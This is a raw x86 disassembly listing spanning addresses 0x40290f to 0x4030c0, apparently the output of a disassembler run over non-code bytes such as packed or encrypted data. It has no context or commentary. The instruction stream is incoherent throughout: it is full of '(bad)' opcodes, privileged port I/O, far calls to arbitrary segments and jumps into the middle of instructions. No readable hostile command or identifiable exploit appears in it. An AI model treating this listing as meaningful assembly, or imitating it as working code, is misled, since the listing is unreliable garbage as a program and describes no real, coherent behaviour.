  40290f:	enter  0xf61f,0x29
  402913:	repz pushf 
  402915:	mov    al,0x9
  402917:	and    DWORD PTR [ebp+0x48677004],edx
  40291d:	fdivr  st(7),st
  40291f:	xchg   DWORD PTR [eax],edx
  402921:	push   ds
  402922:	xchg   ebx,eax
  402923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402924:	sub    DWORD PTR [esi+edi*8],0xd56f0b5e
  40292b:	cmp    eax,0xb4ac6b71
  402930:	mov    dh,0xa5
  402932:	mov    al,BYTE PTR [esi-0x20b27630]
  402938:	sub    bh,BYTE PTR [esi-0x44]
  40293b:	jmp    DWORD PTR [ebp-0x38890bd4]
  402941:	pusha  
  402942:	jo     0x402993
  402944:	push   0xffffffcc
  402946:	sbb    DWORD PTR [ebx-0x70],edx
  402949:	or     DWORD PTR [ecx-0x1d],esi
  40294c:	inc    edx
  40294d:	xchg   edi,eax
  40294e:	outs   dx,BYTE PTR ds:[esi]
  40294f:	pop    ds
  402950:	sbb    eax,0x83ea7b31
  402955:	test   eax,0xb277f562
  40295a:	fsub   st(6),st
  40295c:	mov    ebp,0x7c5236ba
  402961:	into   
  402962:	jg     0x402933
  402964:	cmp    dh,dh
  402966:	jge    0x4029c6
  402968:	test   ecx,0x5b158fe4
  40296e:	(bad)  
  40296f:	adc    dl,BYTE PTR [edx]
  402971:	in     al,dx
  402972:	lods   eax,DWORD PTR ds:[esi]
  402973:	gs aas 
  402975:	cmp    esp,esp
  402977:	bound  eax,QWORD PTR [ebx]
  402979:	and    al,BYTE PTR [ecx]
  40297b:	pusha  
  40297c:	test   BYTE PTR [eax+0x5201a027],0x68
  402983:	adc    BYTE PTR [esi+0x83c6f9d],bh
  402989:	mov    ecx,0x5b1ae652
  40298e:	rcl    BYTE PTR [esi],cl
  402990:	rcl    DWORD PTR [esi+0x3],0x5c
  402994:	cmp    ebp,DWORD PTR [ecx+0x3556ed37]
  40299a:	repz and BYTE PTR [ecx],0x8d
  40299e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40299f:	fstp   st(3)
  4029a1:	(bad)  
  4029a2:	(bad)  
  4029a3:	sbb    ch,al
  4029a5:	xchg   edi,eax
  4029a6:	out    0xdb,eax
  4029a8:	push   eax
  4029a9:	jecxz  0x4029c0
  4029ab:	call   0xbddf:0xc3550b59
  4029b2:	push   ebx
  4029b3:	shl    BYTE PTR [edi],1
  4029b5:	or     esi,DWORD PTR [edi-0x746980e4]
  4029bb:	int3   
  4029bc:	sbb    eax,ecx
  4029be:	push   ebp
  4029bf:	imul   edi,ecx,0x6e
  4029c2:	test   dh,al
  4029c4:	mov    bl,0xbb
  4029c6:	daa    
  4029c7:	fiadd  WORD PTR [esi+0xd]
  4029ca:	cs jle 0x402a33
  4029cd:	cmp    al,0x8f
  4029cf:	mov    esi,0xc01c718b
  4029d4:	adc    BYTE PTR [eax],cl
  4029d6:	ins    DWORD PTR es:[edi],dx
  4029d7:	imul   ebp,DWORD PTR [esp+eax*8-0x7b35334a],0xffffffcd
  4029df:	dec    eax
  4029e0:	cmp    ch,bl
  4029e2:	add    eax,0x3fe7c8d6
  4029e7:	ins    DWORD PTR es:[edi],dx
  4029e8:	int3   
  4029e9:	and    al,BYTE PTR [esi+0x26745103]
  4029ef:	mov    al,BYTE PTR [esi-0x13]
  4029f2:	loopne 0x402a51
  4029f4:	neg    BYTE PTR [edx]
  4029f6:	loopne 0x402a1f
  4029f8:	idiv   DWORD PTR [edi-0x7c8d8fd4]
  4029fe:	arpl   WORD PTR [edi-0x4db8e00a],bp
  402a04:	mov    dh,BYTE PTR [ecx+0x491b3ba5]
  402a0a:	ds stc 
  402a0c:	ror    ebx,0x4f
  402a0f:	call   0xf44b:0x89d5c614
  402a16:	mov    eax,DWORD PTR ds:0xe393fc8f
  402a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a1d:	loopne 0x4029b1
  402a1f:	jb     0x402a3f
  402a21:	in     al,dx
  402a22:	lea    eax,[edx+0x47]
  402a25:	xor    DWORD PTR [esi+0x16],esp
  402a28:	sar    DWORD PTR [esi-0x76372089],1
  402a2e:	repnz pop eax
  402a30:	add    cl,BYTE PTR [edi+0x75]
  402a33:	stc    
  402a34:	inc    esi
  402a35:	loope  0x402a3e
  402a37:	add    bl,0x55
  402a3a:	xor    eax,0x1272828c
  402a3f:	je     0x4029ca
  402a41:	repnz xor al,BYTE PTR [esp+eiz*8]
  402a45:	cmp    BYTE PTR es:[ecx+0x11],0x3c
  402a4a:	adc    cl,al
  402a4c:	xchg   edx,eax
  402a4d:	mov    dh,0xd8
  402a4f:	or     al,0x14
  402a51:	mov    edx,0x36f0d633
  402a56:	sahf   
  402a57:	int3   
  402a58:	cmp    ch,0xd0
  402a5b:	je     0x402a07
  402a5d:	lock loop 0x402ab1
  402a60:	jbe    0x402a42
  402a62:	iret   
  402a63:	inc    ebx
  402a64:	mov    ecx,0x2f04787d
  402a69:	scas   eax,DWORD PTR es:[edi]
  402a6a:	push   edi
  402a6b:	popa   
  402a6c:	fdiv   QWORD PTR [edi+esi*8+0x34]
  402a70:	imul   esi,DWORD PTR [ebx-0x1771a00b],0x58
  402a77:	jne    0x402a48
  402a79:	pop    ss
  402a7a:	(bad)  
  402a7b:	test   al,0x46
  402a7d:	adc    al,0xcd
  402a7f:	xor    al,BYTE PTR fs:0xb60dc6a7
  402a86:	fiadd  WORD PTR ds:0xbfe73c80
  402a8c:	xor    BYTE PTR [esi-0x5],0xc8
  402a90:	inc    eax
  402a91:	mov    cl,0xde
  402a93:	jo     0x402b02
  402a95:	inc    edi
  402a96:	and    DWORD PTR [edi],0xffffff94
  402a99:	stos   BYTE PTR es:[edi],al
  402a9a:	push   ebx
  402a9b:	add    BYTE PTR [ecx+0x42],bl
  402a9e:	ins    DWORD PTR es:[edi],dx
  402a9f:	mov    ebx,0xd545951c
  402aa4:	scas   eax,DWORD PTR es:[edi]
  402aa5:	and    eax,0x475fcbb4
  402aaa:	add    DWORD PTR [edx],esi
  402aac:	and    BYTE PTR [ebp+ecx*2+0x77d59224],dh
  402ab3:	sbb    DWORD PTR [ecx],eax
  402ab5:	adc    ebx,DWORD PTR [eax-0x40]
  402ab8:	or     ah,BYTE PTR [esi+ebp*4-0x4fb7688f]
  402abf:	push   0x5b21dc11
  402ac4:	mov    eax,ds:0xbe9d4661
  402ac9:	repz in eax,dx
  402acb:	mov    WORD PTR [ebx+0x7a],fs
  402ace:	ins    DWORD PTR es:[edi],dx
  402acf:	jbe    0x402b2b
  402ad1:	dec    eax
  402ad2:	mov    ch,0xfe
  402ad4:	xor    al,0x1e
  402ad6:	cwde   
  402ad7:	mov    edx,0x86c8037d
  402adc:	xor    eax,0x8a92d7f2
  402ae1:	loope  0x402aed
  402ae3:	pop    edi
  402ae4:	pop    esi
  402ae5:	mov    esi,0x782771e2
  402aea:	add    al,BYTE PTR [ecx+0x626a9ae8]
  402af0:	sub    bh,BYTE PTR [eax-0x38]
  402af3:	pop    ecx
  402af4:	mov    dh,BYTE PTR [edi+0x3b5d8ac2]
  402afa:	push   0xffffffd3
  402afc:	jns    0x402b0d
  402afe:	sub    al,0xfc
  402b00:	loope  0x402a94
  402b02:	mov    eax,0x814bf658
  402b07:	jp     0x402ad7
  402b09:	push   0x40
  402b0b:	jg     0x402ae5
  402b0d:	sar    BYTE PTR [esi+0x23],cl
  402b10:	or     eax,0xee8cc0d2
  402b15:	fistp  DWORD PTR [edi+0x5e]
  402b18:	adc    cl,cl
  402b1a:	lods   eax,DWORD PTR ds:[esi]
  402b1b:	or     BYTE PTR [ebx+0x34f5eaf3],bh
  402b21:	mov    WORD PTR [ebp+0x12bc608b],?
  402b27:	enter  0x72bf,0xa5
  402b2b:	js     0x402b26
  402b2d:	xchg   ebp,eax
  402b2e:	shl    DWORD PTR [edx+edi*8],0x6e
  402b32:	sub    al,0xae
  402b34:	test   eax,0x9ea09743
  402b39:	mov    cl,0x78
  402b3b:	xchg   bl,ch
  402b3d:	xchg   esp,eax
  402b3e:	lods   eax,DWORD PTR ds:[esi]
  402b3f:	mov    dh,0x3a
  402b41:	jge    0x402b72
  402b43:	ror    dl,1
  402b45:	add    BYTE PTR [edx],al
  402b47:	mov    edi,0xfe5249b7
  402b4c:	stos   DWORD PTR es:[edi],eax
  402b4d:	dec    ebp
  402b4e:	lahf   
  402b4f:	mov    al,0x5c
  402b51:	je     0x402ad9
  402b53:	test   al,0xb3
  402b55:	ja     0x402b90
  402b57:	mov    ah,bh
  402b59:	add    DWORD PTR [ecx],esi
  402b5b:	fs mov ch,0xdd
  402b5e:	pop    es
  402b5f:	jmp    0xb03c:0x1a29b888
  402b66:	sbb    bl,BYTE PTR [edi]
  402b68:	xor    DWORD PTR [ebp-0x1ac23349],eax
  402b6e:	pop    esi
  402b6f:	rcl    eax,0x8c
  402b72:	pop    edx
  402b73:	xor    esp,ebp
  402b75:	(bad)  
  402b76:	aam    0xe4
  402b78:	and    al,0x71
  402b7a:	in     eax,0xa2
  402b7c:	sti    
  402b7d:	mov    ch,0xbc
  402b7f:	or     al,0x75
  402b81:	in     al,0x4f
  402b83:	repz pusha 
  402b85:	inc    eax
  402b86:	loopne 0x402ba7
  402b88:	or     ebx,edx
  402b8a:	hlt    
  402b8b:	or     al,0xba
  402b8d:	clc    
  402b8e:	add    al,dh
  402b90:	int    0x42
  402b92:	mov    dh,0xc8
  402b94:	std    
  402b95:	jp     0x402c07
  402b97:	fld    QWORD PTR [ebx+0x69]
  402b9a:	addr16 add bl,ch
  402b9d:	cmp    bh,BYTE PTR [ecx-0x3]
  402ba0:	ret    0x5975
  402ba3:	sbb    ch,0xc6
  402ba6:	adc    cl,BYTE PTR ds:0xacdb295b
  402bac:	(bad)  
  402bae:	adc    al,0x8b
  402bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bb1:	ins    BYTE PTR es:[edi],dx
  402bb2:	and    DWORD PTR [edi-0x7bb8a5c7],esi
  402bb8:	inc    eax
  402bb9:	xor    BYTE PTR [eax],bl
  402bbb:	int    0xce
  402bbd:	cmp    DWORD PTR [edx+0x7c],0x3623e5f2
  402bc4:	hlt    
  402bc5:	inc    eax
  402bc6:	shl    DWORD PTR ds:0x16fe6d64,1
  402bcc:	retf   
  402bcd:	fwait
  402bce:	daa    
  402bcf:	test   bl,0xa7
  402bd2:	enter  0xa858,0x2e
  402bd6:	test   bh,dh
  402bd8:	push   0x86635ace
  402bdd:	mov    ch,0x78
  402bdf:	pop    edx
  402be0:	sbb    edx,DWORD PTR [esi+0x3f9f579]
  402be6:	mov    esp,0x64d651b
  402beb:	std    
  402bec:	mov    eax,0x2f9ab533
  402bf1:	jb     0x402ba0
  402bf3:	xor    cl,BYTE PTR [edi-0x17]
  402bf6:	xor    dh,BYTE PTR [ecx-0x561480aa]
  402bfc:	frstor [ecx]
  402bfe:	cmp    bl,al
  402c00:	fcmovne st,st(0)
  402c02:	adc    al,0xbd
  402c04:	push   ebp
  402c05:	imul   ebx,esi,0xba6375d7
  402c0b:	outs   dx,DWORD PTR ds:[esi]
  402c0c:	retf   
  402c0d:	inc    eax
  402c0e:	pop    ebp
  402c0f:	dec    ebx
  402c10:	inc    ecx
  402c11:	clc    
  402c12:	inc    ecx
  402c13:	or     DWORD PTR [ecx+0x25],ecx
  402c16:	ds ret 0x7563
  402c1a:	in     eax,dx
  402c1b:	outs   dx,DWORD PTR ds:[esi]
  402c1c:	dec    esi
  402c1d:	and    eax,0x59d62d72
  402c22:	into   
  402c23:	test   BYTE PTR [eax+0x32a04c3c],ch
  402c29:	dec    eax
  402c2a:	inc    edx
  402c2b:	out    dx,al
  402c2c:	pop    edi
  402c2d:	adc    ebp,esp
  402c2f:	ds cmp al,0x9
  402c32:	inc    eax
  402c33:	repnz cdq 
  402c35:	or     eax,0xeca1a81c
  402c3a:	mov    edx,0x76865bf8
  402c3f:	mov    WORD PTR [ecx-0x29],?
  402c42:	mov    eax,0xc9fd0b7c
  402c47:	dec    esi
  402c48:	in     eax,0xda
  402c4a:	icebp  
  402c4b:	xchg   DWORD PTR [eax+edx*1],eax
  402c4e:	fistp  QWORD PTR [esi+0x9]
  402c51:	rcr    al,0x5b
  402c54:	jp     0x402bfd
  402c56:	dec    esi
  402c57:	lea    ecx,[edi-0x69]
  402c5a:	ss push 0xffffffdc
  402c5d:	mov    esi,0x85a9ec71
  402c62:	sub    ebp,DWORD PTR [edi+0x2bf1e228]
  402c68:	adc    ch,BYTE PTR [edx-0x17a30c0b]
  402c6e:	mov    ebp,0x7fe39ad2
  402c73:	jmp    0x402c33
  402c75:	mov    al,0xd0
  402c77:	sahf   
  402c78:	dec    edx
  402c79:	jge    0x402c29
  402c7b:	ins    DWORD PTR es:[edi],dx
  402c7c:	xchg   esp,eax
  402c7d:	test   al,0xd
  402c7f:	lds    ecx,FWORD PTR [edx-0x35d75532]
  402c85:	aaa    
  402c86:	sub    DWORD PTR [ebp+0x7f],esi
  402c89:	inc    ecx
  402c8a:	ds xchg edi,eax
  402c8c:	xchg   ebx,eax
  402c8d:	mov    ds,ebx
  402c8f:	xor    eax,esp
  402c91:	sbb    DWORD PTR [eax],esi
  402c93:	adc    DWORD PTR [ebp-0x472f91f2],eax
  402c99:	ret    0xad9b
  402c9c:	jae    0x402cae
  402c9e:	sbb    eax,0xa4638b52
  402ca3:	dec    esi
  402ca4:	adc    ebp,0x3602107f
  402caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cab:	ins    BYTE PTR es:[edi],dx
  402cac:	cmp    eax,0xed67b312
  402cb1:	retf   0x7afc
  402cb4:	push   ds
  402cb5:	out    dx,al
  402cb6:	jge    0x402cb9
  402cb8:	xor    DWORD PTR [ebx+0x7b],ebx
  402cbb:	adc    dl,BYTE PTR [esi]
  402cbd:	add    eax,0xbd8e4816
  402cc2:	fs jle 0x402d3e
  402cc5:	add    ebx,DWORD PTR [ecx-0x76de51c5]
  402ccb:	hlt    
  402ccc:	jo     0x402c5a
  402cce:	dec    ecx
  402ccf:	clc    
  402cd0:	unpckhps xmm3,XMMWORD PTR [eax+edi*8+0x139fd34b]
  402cd8:	mov    ebp,0x5e79fe9b
  402cdd:	sub    ebx,DWORD PTR [esi-0x6c]
  402ce0:	sub    DWORD PTR [edi+0x6af42078],esi
  402ce6:	sub    ah,BYTE PTR [edx]
  402ce8:	les    esi,FWORD PTR [esi-0x77]
  402ceb:	out    dx,eax
  402cec:	popa   
  402ced:	push   cs
  402cee:	push   esi
  402cef:	pop    esi
  402cf0:	jnp    0x402c8d
  402cf2:	push   ebx
  402cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cf4:	int    0x3d
  402cf6:	popf   
  402cf7:	retf   
  402cf8:	repz cmc 
  402cfa:	nop
  402cfb:	retf   0xcbd6
  402cfe:	mov    bl,0x7b
  402d00:	call   0xd4fa:0x889e3aca
  402d07:	ret    0x4687
  402d0a:	mov    ds:0xd0899148,eax
  402d0f:	xchg   esp,eax
  402d10:	dec    esi
  402d11:	jnp    0x402ccd
  402d13:	push   es
  402d14:	xchg   ecx,eax
  402d15:	int3   
  402d16:	or     eax,0xc1437df3
  402d1b:	xchg   ebx,eax
  402d1c:	mov    cl,BYTE PTR [esi-0xf]
  402d1f:	xchg   edx,eax
  402d20:	xor    eax,0x8759622e
  402d25:	fisttp WORD PTR [ecx]
  402d27:	out    dx,al
  402d28:	jne    0x402d58
  402d2a:	add    eax,0x182485ef
  402d2f:	inc    ebx
  402d30:	xchg   WORD PTR [edi+0x2a51d4e6],sp
  402d37:	(bad)  
  402d38:	xchg   ebp,eax
  402d39:	or     al,0x19
  402d3b:	aaa    
  402d3c:	(bad)  
  402d3d:	loop   0x402d07
  402d3f:	enter  0x9f2f,0x6b
  402d43:	imul   edi,DWORD PTR [ecx],0x709b2a5f
  402d49:	push   0xffffffa9
  402d4b:	out    dx,eax
  402d4c:	pop    esp
  402d4d:	not    DWORD PTR [ecx+0x54e2b6fd]
  402d53:	mov    ah,0x69
  402d55:	ss ss scas al,BYTE PTR es:[edi]
  402d58:	push   es
  402d59:	adc    al,0x9a
  402d5b:	aaa    
  402d5c:	or     al,0xf4
  402d5e:	inc    ecx
  402d5f:	cdq    
  402d60:	pop    ds
  402d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d62:	inc    esi
  402d63:	push   ecx
  402d64:	push   esi
  402d65:	sub    al,0x51
  402d67:	pop    ecx
  402d68:	sub    cl,BYTE PTR [ecx-0x55f7fddd]
  402d6e:	dec    ecx
  402d6f:	sbb    bh,al
  402d71:	repnz icebp 
  402d73:	out    dx,eax
  402d74:	and    BYTE PTR [esi],cl
  402d76:	movaps xmm6,xmm1
  402d79:	push   ecx
  402d7a:	fpatan 
  402d7c:	sub    cl,dl
  402d7e:	into   
  402d7f:	mov    ebx,0xfd1318e4
  402d84:	mov    bh,BYTE PTR [edi+0x37]
  402d87:	sbb    ecx,DWORD PTR [edi+edi*4-0x67612021]
  402d8e:	repz sbb BYTE PTR [ebx+ebp*2],dh
  402d92:	pop    ecx
  402d93:	in     eax,0x84
  402d95:	or     dh,BYTE PTR [esi-0x553e0400]
  402d9b:	out    0xb2,eax
  402d9d:	pop    ecx
  402d9e:	mov    ah,0xcc
  402da0:	push   esp
  402da1:	fdiv   DWORD PTR [ecx-0x7b]
  402da4:	out    dx,al
  402da5:	mov    ebx,0xbc48d8c
  402daa:	jmp    0x402d76
  402dac:	call   0x93b43eab
  402db1:	fadd   DWORD PTR [ebx+eax*2+0x27]
  402db5:	mov    bl,0x71
  402db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402db8:	xchg   BYTE PTR [ecx+0x2d241e18],dh
  402dbe:	into   
  402dbf:	aaa    
  402dc0:	iret   
  402dc1:	js     0x402dce
  402dc3:	push   ebx
  402dc4:	or     al,0xd2
  402dc6:	test   DWORD PTR [ebx+0x3fae0d15],edi
  402dcc:	jl     0x402d68
  402dce:	push   esi
  402dcf:	ins    DWORD PTR es:[edi],dx
  402dd0:	mov    ds:0xaa3cdb35,al
  402dd5:	adc    cl,BYTE PTR [edi-0x2c46f74d]
  402ddb:	jmp    0xf24a:0x1e16a51a
  402de2:	call   0xa0b91e1
  402de7:	xor    eax,0x962bafb7
  402dec:	ret    
  402ded:	jg     0x402e5b
  402def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402df0:	mov    esi,0x82d87ed
  402df5:	repnz in eax,dx
  402df7:	aam    0x1e
  402df9:	fs int3 
  402dfb:	push   cs
  402dfc:	jb     0x402e77
  402dfe:	fdiv   DWORD PTR [edx-0x42]
  402e01:	jmp    0xfbe6:0xb8df0c27
  402e08:	and    DWORD PTR [ecx],0x3d
  402e0b:	sub    bh,BYTE PTR [esi-0x1bee299]
  402e11:	cmp    edx,edx
  402e13:	mov    dh,BYTE PTR [ebp-0xd]
  402e16:	dec    esi
  402e17:	adc    DWORD PTR [edi+0x6546598e],ecx
  402e1d:	add    bh,BYTE PTR [edx+0x1f]
  402e20:	gs std 
  402e22:	mov    dh,0x47
  402e24:	int3   
  402e25:	cmp    ah,al
  402e27:	test   eax,0xc722e239
  402e2c:	jge    0x402dbf
  402e2e:	scas   eax,DWORD PTR es:[edi]
  402e2f:	(bad)  
  402e30:	mov    bh,0x4d
  402e32:	retf   
  402e33:	lea    eax,[eax]
  402e35:	cmp    DWORD PTR [esi+0x5d],esi
  402e38:	pusha  
  402e39:	mov    edi,es
  402e3b:	push   esp
  402e3c:	cmp    al,0xff
  402e3e:	out    dx,al
  402e3f:	es imul edx,edi,0xfffffffe
  402e43:	fwait
  402e44:	in     al,0x81
  402e46:	fs dec eax
  402e48:	popa   
  402e49:	sub    BYTE PTR [ebp-0x30137b60],al
  402e4f:	or     BYTE PTR [ebp+eax*4-0x23be2589],0x2c
  402e57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e58:	push   ecx
  402e59:	out    dx,al
  402e5a:	in     eax,0xc8
  402e5c:	dec    ebx
  402e5d:	add    eax,0xc548cebb
  402e62:	ins    DWORD PTR es:[edi],dx
  402e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e64:	jg     0x402ea2
  402e66:	and    BYTE PTR [ebx*8-0x5ffe49d2],cl
  402e6d:	xor    al,0x98
  402e6f:	les    ebx,FWORD PTR [esp+ebp*8-0x8bd5d4]
  402e76:	push   edi
  402e77:	out    0xb,al
  402e79:	mov    cs,WORD PTR [ebx+edi*4+0x62]
  402e7d:	xor    eax,0x6dbc4bb
  402e82:	jl     0x402e43
  402e84:	jo     0x402e64
  402e86:	pop    ecx
  402e87:	jl     0x402e7e
  402e89:	xchg   cl,bh
  402e8b:	out    0xf,al
  402e8d:	sub    DWORD PTR [edx+eiz*8+0x32],edi
  402e91:	pusha  
  402e92:	mov    eax,0x57d4242f
  402e97:	stos   DWORD PTR es:[edi],eax
  402e98:	scas   al,BYTE PTR es:[edi]
  402e99:	pop    ebx
  402e9a:	or     BYTE PTR [ebx],dh
  402e9c:	enter  0x1e85,0x4
  402ea0:	add    ebx,DWORD PTR [edx+0x25]
  402ea3:	dec    ecx
  402ea4:	inc    ecx
  402ea5:	es pusha 
  402ea7:	ficomp DWORD PTR gs:[esi]
  402eaa:	adc    dh,BYTE PTR [edx]
  402eac:	add    DWORD PTR [ecx],ebx
  402eae:	mov    ebp,0x35749d61
  402eb3:	xor    al,0xfb
  402eb5:	sbb    DWORD PTR [esi],ecx
  402eb7:	push   ebx
  402eb8:	sub    al,0x15
  402eba:	inc    edx
  402ebb:	adc    al,0xa9
  402ebd:	dec    edx
  402ebe:	sub    BYTE PTR [eax],bl
  402ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ec1:	push   edx
  402ec2:	test   eax,0xdcce805e
  402ec7:	sbb    al,0x75
  402ec9:	mov    DWORD PTR [esi+0x1646b8d4],ebx
  402ecf:	push   ecx
  402ed0:	sbb    DWORD PTR [edx],ecx
  402ed2:	sub    BYTE PTR [ecx+0x46],0x6d
  402ed6:	jnp    0x402ef5
  402ed8:	dec    ecx
  402ed9:	jle    0x402ed3
  402edb:	jp     0x402eea
  402edd:	push   ebx
  402ede:	inc    eax
  402edf:	loope  0x402e6c
  402ee1:	push   ebx
  402ee2:	xchg   ebp,eax
  402ee3:	(bad)  
  402ee4:	mov    edi,0x1d8f95df
  402ee9:	mov    ?,edx
  402eeb:	or     BYTE PTR [edi],al
  402eed:	push   ecx
  402eee:	je     0x402f48
  402ef0:	xlat   BYTE PTR ds:[ebx]
  402ef1:	inc    edi
  402ef2:	rol    BYTE PTR [ecx-0x8cba64e],0xa0
  402ef9:	add    ah,BYTE PTR [eax+0x10]
  402efc:	or     DWORD PTR [ebp+eax*2-0x6cea30be],eax
  402f03:	(bad)  
  402f04:	mov    al,0x1a
  402f06:	es loop 0x402e94
  402f09:	sti    
  402f0a:	mov    al,0x12
  402f0c:	fwait
  402f0d:	sub    ebx,ebp
  402f0f:	add    BYTE PTR [ebx-0x2b],al
  402f12:	int3   
  402f13:	nop
  402f14:	inc    esp
  402f15:	or     DWORD PTR [esi-0x418fe07f],0x71
  402f1c:	or     eax,ebp
  402f1e:	lahf   
  402f1f:	in     al,0xb
  402f21:	pushf  
  402f22:	cmp    dl,BYTE PTR [ebp-0x685c58d4]
  402f28:	pop    eax
  402f29:	mov    BYTE PTR cs:[ebp-0x66b93f61],bl
  402f30:	scas   al,BYTE PTR es:[edi]
  402f31:	pcmpgtw mm2,QWORD PTR [ecx+0x36]
  402f35:	cmp    eax,DWORD PTR [ebx-0x7d]
  402f38:	call   0x6f89:0x696a4553
  402f3f:	add    ch,dl
  402f41:	addr16 sbb al,0x74
  402f44:	jmp    0x84df:0xa1b23912
  402f4b:	icebp  
  402f4c:	ja     0x402fa0
  402f4e:	or     eax,DWORD PTR ds:0x964584b5
  402f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f55:	arpl   WORD PTR [ecx],cx
  402f57:	retf   
  402f58:	cs dec eax
  402f5a:	cmp    DWORD PTR [esi+0x10cd3626],ebp
  402f60:	dec    edx
  402f61:	test   eax,0xfc6fbadf
  402f66:	mov    ebp,0xce3d5b10
  402f6b:	inc    esp
  402f6c:	add    DWORD PTR [ecx+0x21748be],edi
  402f72:	pop    sp
  402f74:	push   es
  402f75:	dec    esp
  402f76:	dec    eax
  402f77:	fdivrp st(5),st
  402f79:	sti    
  402f7a:	int    0x92
  402f7c:	mov    cl,0xfc
  402f7e:	xlat   BYTE PTR ds:[ebx]
  402f7f:	adc    eax,0x98431e5b
  402f84:	ja     0x402f34
  402f86:	sub    ebx,esp
  402f88:	or     bh,BYTE PTR [edi]
  402f8a:	popa   
  402f8b:	xchg   esp,eax
  402f8c:	and    al,BYTE PTR [eax]
  402f8e:	outs   dx,DWORD PTR ds:[esi]
  402f8f:	sahf   
  402f90:	test   BYTE PTR [ecx+0x63],0xa
  402f94:	pop    ecx
  402f95:	fist   DWORD PTR [edx+0x13]
  402f98:	xchg   ch,ah
  402f9a:	xchg   edi,eax
  402f9b:	pop    esi
  402f9c:	lds    edi,FWORD PTR [edx-0x40]
  402f9f:	push   es
  402fa0:	(bad)  
  402fa1:	xor    BYTE PTR [edi-0x2df7443],bh
  402fa7:	xchg   esi,eax
  402fa8:	mov    bl,0x21
  402faa:	pop    ecx
  402fab:	ins    DWORD PTR es:[edi],dx
  402fac:	jo     0x402fd1
  402fae:	mov    eax,ds:0xa8649908
  402fb3:	aas    
  402fb4:	test   al,0x20
  402fb6:	mov    esp,DWORD PTR [ebp-0x5613c120]
  402fbc:	inc    edx
  402fbd:	cli    
  402fbe:	sbb    edi,DWORD PTR [esi+eiz*1+0x208b1d08]
  402fc5:	in     al,0x79
  402fc7:	or     eax,0x82895dfc
  402fcc:	cld    
  402fcd:	inc    ebp
  402fce:	mov    esp,0x98333614
  402fd3:	sbb    eax,0x47d66948
  402fd8:	add    dh,cl
  402fda:	mov    ch,0x51
  402fdc:	cmc    
  402fdd:	out    dx,al
  402fde:	call   DWORD PTR [eax+0x6b27c746]
  402fe4:	dec    ecx
  402fe5:	imul   esi,DWORD PTR [ecx-0x3e3b569c],0x17
  402fec:	stc    
  402fed:	jp     0x402f9f
  402fef:	add    DWORD PTR [edx],edi
  402ff1:	and    edi,edx
  402ff3:	inc    ebp
  402ff4:	fstp   QWORD PTR [edi]
  402ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ff8:	jecxz  0x403007
  402ffa:	aas    
  402ffb:	in     eax,0xd6
  402ffd:	adc    al,0xa0
  402fff:	popf   
  403000:	mov    dl,0x98
  403002:	jne    0x402fa4
  403004:	mov    ss,WORD PTR [ebp+0x57]
  403007:	jae    0x403028
  403009:	jecxz  0x402f9d
  40300b:	test   DWORD PTR es:[edx+ebx*4-0x74f8cdcb],esi
  403013:	sar    DWORD PTR [esi],1
  403015:	add    al,0x20
  403017:	xor    ch,BYTE PTR [ebx+eax*2-0x41]
  40301b:	cmp    ebx,DWORD PTR [esp+edi*2]
  40301e:	out    0x98,al
  403020:	pop    ebp
  403022:	daa    
  403023:	mov    dl,0x6
  403025:	jnp    0x403011
  403027:	popa   
  403028:	cmp    esi,0x64
  40302b:	jne    0x402ff5
  40302d:	xchg   edx,eax
  40302e:	(bad)  
  40302f:	out    dx,eax
  403030:	data16 fwait
  403032:	pop    eax
  403033:	lock outs dx,BYTE PTR ds:[esi]
  403035:	cmc    
  403036:	mov    ah,0x24
  403038:	iret   
  403039:	aaa    
  40303a:	cmp    bh,BYTE PTR [eax+0x77ad4275]
  403040:	push   edx
  403041:	jbe    0x40309c
  403043:	mov    ch,0xd2
  403045:	(bad)  
  403046:	(bad)  
  403048:	lds    ebp,FWORD PTR [ecx+0x3d]
  40304b:	adc    bh,cl
  40304d:	mov    eax,ss:0x1aaeda33
  403053:	inc    edi
  403054:	retf   
  403055:	out    0xe4,al
  403057:	mov    dl,0xf2
  403059:	push   ebp
  40305a:	retf   0x8f4e
  40305d:	call   0x9e7639fe
  403062:	lods   al,BYTE PTR ds:[esi]
  403063:	test   al,0x4a
  403065:	je     0x403090
  403067:	inc    eax
  403068:	dec    edx
  403069:	pushf  
  40306a:	enter  0xfcc0,0x6e
  40306e:	hlt    
  40306f:	dec    ebx
  403070:	adc    al,dh
  403072:	cmp    dl,BYTE PTR [edi]
  403074:	rcl    DWORD PTR [edx-0x10124fba],1
  40307a:	int    0x48
  40307c:	out    0x33,al
  40307e:	ss aad 0x48
  403081:	fist   WORD PTR ds:0x8a9a1bd1
  403087:	or     al,0x6d
  403089:	add    ebp,DWORD PTR [eax+0x2b17362d]
  40308f:	inc    ecx
  403090:	fild   QWORD PTR [ebx+0x3f]
  403093:	lahf   
  403094:	pop    es
  403095:	mov    ch,0x7d
  403097:	call   0xcde8bccf
  40309c:	fwait
  40309d:	lods   al,BYTE PTR ds:[esi]
  40309e:	in     al,dx
  40309f:	retf   
  4030a0:	imul   ecx,DWORD PTR [eax],0xfffffff1
  4030a3:	push   eax
  4030a4:	pusha  
  4030a5:	jb     0x4030db
  4030a7:	lahf   
  4030a8:	imul   edx,DWORD PTR [ecx],0x5eb1c2d0
  4030ae:	cmp    esi,DWORD PTR [esi+0x38]
  4030b1:	mul    BYTE PTR [edi+esi*4+0x63e73052]
  4030b8:	popf   
  4030b9:	pop    edi
  4030ba:	test   al,0xe7
  4030bc:	jne    0x40304c
  4030be:	add    ebp,esi
  4030c0:	sbb    DWORD PTR [ebx+0x74],0x6d
